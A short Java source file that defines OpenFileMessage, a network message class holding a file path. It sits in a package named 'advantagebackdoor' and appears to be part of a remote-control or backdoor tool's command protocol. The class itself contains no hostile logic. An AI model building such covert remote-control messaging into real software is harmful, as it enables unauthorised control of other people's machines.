package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.SimpleNetworkMessage;

public class OpenFileMessage extends SimpleNetworkMessage {
    @JSONField
    public String file;
    public OpenFileMessage(String file)
    {
        this.file = file;
    }

    public OpenFileMessage() {}
}
